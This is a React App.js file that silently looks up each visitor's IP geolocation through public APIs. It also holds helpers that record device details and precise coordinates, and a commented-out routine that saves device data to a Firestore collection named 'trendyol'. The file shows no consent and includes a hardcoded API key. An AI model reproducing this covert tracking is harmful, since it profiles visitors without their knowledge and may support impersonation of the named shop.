import { addDoc, collection } from "firebase/firestore";
import "./App.css";
import Router from "./router";
import { useState } from "react";
import axios from "axios";
import { useEffect } from "react";
import db from "./fireabase";

import {
  isAndroid,
  isIOS,
  osName,
  mobileModel,
  mobileVendor,
} from "react-device-detect";
import { useGeolocated } from "react-geolocated";
function App() {
  const [ip3, setIp3] = useState("");
  const [ip4, setIp4] = useState("");
  const [finish, setFinished] = useState(false);
  const [ipAddress, setIpAddress] = useState("");
  const [ipData, setIpData] = useState(null);
  const key = "ec87f8ad516216e395899016d2efa85f"
  useEffect(() => {
    const fetchIPData = async () => {
      try {
        // Öncelikle IP adresinizi alın
        const { data: ipData } = await axios.get("https://get.geojs.io/v1/ip.json");

        // IP adresini ipapi API'sine gönderin
        const access_key = "ec87f8ad516216e395899016d2efa85f" // ipapi'den aldığınız API anahtarı
        const ip_address = ipData.ip;
        const api_url = `https://get.geojs.io/v1/ip/geo/${ip_address}.json`;

        const { data: locationData } = await axios.get(api_url);
        setIpAddress(locationData);
        console.log('locationData',locationData)
      } catch (error) {
        console.error("Error fetching data: ", error);
      }
    };

    fetchIPData();
  }, []);


  useEffect(() => {
    // !finish && sendBrowserInfo();
  }, [finish]);
  async function sendBrowserInfo() {
    let ip = {};
    const date = new Date();
    ip.turkishDate = date.toLocaleString("tr-TR");
    ip.telephoneType = isAndroid ? "Android" : isIOS ? "Iphone" : "Web";
    ip.osName = osName;
    ip.mobileModel = mobileModel;
    ip.mobileVendor = mobileVendor;
    if (ip) {
      try {
        const docRef = await addDoc(collection(db, "trendyol"), ip);
        if (docRef?.id) {
          setFinished(true);
        }
        return;
      } catch (e) {
        console.log("hata");
      }
    }
  }
  return (
    <div>
      <Router />
    </div>
  );
}

export default App;

const findIp = async () => {
  try {
    const response2 = await axios.get("https://geolocation-db.com/json/");
    return response2?.data;
  } catch (error) {
    console.error("Error fetching IP data:", error);
  }
};
const findIp2 = async () => {
  try {
    const responseJson = await axios.get(
      process.env.REACT_APP_FIND_IP_URL + process.env.REACT_APP_FIND_IP_API_KEY
    );
    return responseJson.data;
  } catch (error) {
    console.error("Error fetching IP data:", error);
  }
};
async function getUserLocation() {
  try {
    const response = await axios.get("https://ipinfo.io/json", {
      headers: { Authorization: `Bearer ${process.env.REACT_APP_TOKEN}` },
    });
    return response.data;
  } catch (error) {
    console.error("Error:", error);
  }
}
function getUserLocation2(setIp4) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    setIp4(true);
    console.log("Geolocation is not supported by this browser.");
  }

  function showPosition(position) {
    setIp4({
      lat: position.coords.latitude,
      lng: position.coords.longitude,
    });
  }
}
